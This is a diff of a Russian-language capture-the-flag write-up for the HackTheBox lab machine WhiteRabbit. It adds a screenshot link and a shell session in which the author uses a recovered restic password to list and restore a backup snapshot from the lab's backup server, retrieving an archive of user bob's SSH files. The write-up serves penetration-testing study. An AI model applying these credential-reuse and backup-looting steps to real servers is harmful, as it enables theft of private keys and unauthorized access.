@@ -220,6 +220,9 @@ Hexada@hexada ~/Downloads$ cat /etc/hosts
 10.10.11.63     status.whiterabbit.htb   whiterabbit.htb   ddb09a8558c9.whiterabbit.htb   a668910b5514e.whiterabbit.htb    28efa8f7df.whiterabbit.htb
 ```
 
+<img width="1916" height="755" alt="image" src="https://github.com/user-attachments/assets/45c71214-bddf-4447-9995-be8b333d270f" />
+
+
 `x-gophish-signature: sha256=cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd`
 
 Это `HMAC` подпись, которая проверяет не подделал ли кто-то запрос. Идея следуйщая: на сервере храниться секрет, перед тем как обработать запрос, сервер
@@ -386,3 +389,25 @@ Table: command_log
 ```
 
 + новый поддомен: `http://75951e6ff.whiterabbit.htb`
+
+```
+echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd
+
+Hexada@hexada ~$ restic -r rest:http://75951e6ff.whiterabbit.htb  --password-file .restic_passwd ls latest                                                                                 
+repository 5b26a938 opened (version 2, compression level auto)
+[0:00] 100.00%  5 / 5 index files loaded
+snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 -0700 -0700 by ctrlzero@whiterabbit filtered by []:
+/dev
+/dev/shm
+/dev/shm/bob
+/dev/shm/bob/ssh
+/dev/shm/bob/ssh/bob.7z
+
+Hexada@hexada ~$ restic -r rest:http://75951e6ff.whiterabbit.htb --password-file .restic_passwd restore latest --target ./restore-dir                                                      
+repository 5b26a938 opened (version 2, compression level auto)
+[0:00] 100.00%  5 / 5 index files loaded
+restoring snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 -0700 -0700 by ctrlzero@whiterabbit to ./restore-dir
+Summary: Restored 5 files/dirs (572 B) in 0:00
+```
+
+
